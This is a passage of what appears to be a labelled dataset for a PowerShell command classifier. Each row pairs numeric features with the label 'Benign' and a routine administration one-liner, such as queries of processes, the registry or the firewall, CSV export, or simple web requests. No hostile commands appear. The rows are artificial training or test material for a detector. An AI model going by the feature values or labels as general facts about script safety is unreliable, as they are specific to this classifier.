31,1,31.0,4.0022680844408445,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0967741935483871,0.2857142857142857,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-101,New-Object System.Net.WebClient
32,1,32.0,4.75,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.28125,0.25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-102,"[System.Math]::Round(3.14159, 2)"
33,1,33.0,4.173033892020167,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.15151515151515152,0.16666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-103,[System.Environment]::MachineName
45,1,45.0,4.178088307912703,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.06666666666666667,0.22580645161290322,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-104,"Get-NetFirewallProfile | Select Name, Enabled"
67,1,67.0,4.863053982485715,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08955223880597014,0.5526315789473685,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-105,Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion
77,1,77.0,4.935236865201645,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.11688311688311688,0.24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-106,Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled}
49,1,49.0,4.515234273075878,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.12244897959183673,0.21212121212121213,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-107,Export-Csv -Path C:\report.csv -NoTypeInformation
53,1,53.0,4.519635548576258,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1509433962264151,0.22580645161290322,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-108,Import-Csv -Path C:\data.csv | Select-Object -First 5
45,1,45.0,4.558519762996341,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08888888888888889,0.3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-109,ConvertTo-Json -InputObject $env:PSModulePath
31,1,31.0,4.0667842134731025,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.12903225806451613,0.2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-110,Measure-Command { Get-Process }
37,1,37.0,4.185823555333621,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.10810810810810811,0.5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-111,Get-PSDrive | Where-Object Used -GT 0
50,1,50.0,4.2785629396449165,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.12,0.19230769230769232,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-112,Test-Connection -ComputerName 192.168.1.1 -Count 2
68,1,68.0,4.514025805078415,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07352941176470588,0.25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-113,"Get-CimInstance -ClassName Win32_UserAccount | Select Name, Disabled"
57,1,57.0,4.479183707871228,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.12280701754385964,0.30303030303030304,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-114,"Get-Process -Name 'explorer' | Select Id, CPU, WorkingSet"
58,1,58.0,4.308869418714394,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08620689655172414,0.16666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-115,Stop-Process -Name 'notepad' -ErrorAction SilentlyContinue
67,1,67.0,4.544472221770097,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1044776119402985,0.22727272727272727,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-116,Get-WinEvent -ProviderName 'Microsoft-Windows-Sysmon' -MaxEvents 50
67,1,67.0,4.5230432503793505,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.16417910447761194,0.3611111111111111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-117,Set-ItemProperty -Path 'HKCU:\Software\Test' -Name 'Value' -Value 1
63,1,63.0,4.249770597519297,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1111111111111111,0.3157894736842105,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-118,New-PSDrive -Name Z -PSProvider FileSystem -Root \\server\share
13,1,13.0,3.7004397181410926,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-119,Get-Clipboard
28,1,28.0,3.99468036840891,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14285714285714285,0.15789473684210525,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-120,Set-Clipboard -Value 'hello'
62,1,62.0,4.458983013544334,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14516129032258066,0.17073170731707318,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-121,Out-File -FilePath C:\temp\output.txt -InputObject 'log entry'
52,1,52.0,4.361484854574932,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.17307692307692307,0.15151515151515152,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-122,Add-Content -Path C:\temp\log.txt -Value 'new entry'
50,1,50.0,4.254177320667442,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2,0.16129032258064516,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-123,Select-String -Path C:\temp\*.log -Pattern 'error'
61,1,61.0,4.772195788988178,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.22950819672131148,0.20588235294117646,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-124,Where-Object {$_.Name -like '*svc*'} | Format-Table -AutoSize
66,1,66.0,4.431933749849817,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07575757575757576,0.20930232558139536,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-125,Sort-Object -Property LastWriteTime -Descending | Select -First 10
57,1,57.0,4.346868533388641,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07017543859649122,0.175,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-126,Group-Object -Property Extension | Sort Count -Descending
57,1,57.0,4.129040619800464,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14035087719298245,0.21621621621621623,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-127,Compare-Object (Get-Process) (Get-Process) -Property Name
81,1,81.0,4.5169664329897135,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2222222222222222,0.16666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-128,[System.Net.WebRequest]::Create('https://microsoft.com').GetResponse().StatusCode
59,1,59.0,4.6789218627744855,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1694915254237288,0.21621621621621623,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-129,Invoke-RestMethod -Uri 'https://api.github.com' -Method GET
47,1,47.0,4.440449958558483,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.23404255319148937,0.1724137931034483,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-130,"ConvertFrom-Json -InputObject '{""name"":""test""}'"
41,1,41.0,4.092325102644249,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14634146341463414,0.2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-131,Start-Sleep -Seconds 2; Write-Host 'done'
59,1,59.0,4.315770643024985,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.06779661016949153,0.18604651162790697,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-132,Register-ObjectEvent -InputObject $timer -EventName Elapsed
34,1,34.0,3.878068268345524,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08823529411764706,0.21052631578947367,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-133,Get-Random -Minimum 1 -Maximum 100
